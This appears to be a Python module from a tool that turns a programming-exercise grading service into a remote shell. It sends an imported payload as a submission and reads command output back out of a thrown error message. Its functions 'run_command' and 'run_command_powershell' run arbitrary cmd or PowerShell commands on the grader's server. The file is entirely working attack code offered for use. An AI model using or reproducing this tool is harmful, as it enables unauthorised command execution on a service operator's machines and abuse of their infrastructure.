from tss_cmd.api import answer
from tss_cmd.api.exceptions import ApiException
from tss_cmd.server.cmd_globals import PAYLOAD, PAYLOAD_FUNCTIONS


def payload(cmd: str) -> str:
    return PAYLOAD + f"\nthrow new MyError({cmd})"


def run_payload(function: str, args: list, ticket: int = 3202) -> str:
    code = payload(f"{function}(`{','.join(args)}`)")
    response = answer(ticket, code)[1]

    if response == '"Your program has exceeded its time limit."':
        raise ApiException("Your program has exceeded its time limit")

    return response.split("[MyError: ")[1][:-3]


def run_command(cmd: str, ticket: int = 3202) -> str:
    """Runs command on the server"""

    return run_payload(PAYLOAD_FUNCTIONS["cmd"], [cmd], ticket)


def run_command_powershell(cmd: str, ticket: int = 3202) -> str:
    """Runs command on the server"""

    return run_payload(PAYLOAD_FUNCTIONS["pwsh"], [cmd], ticket)
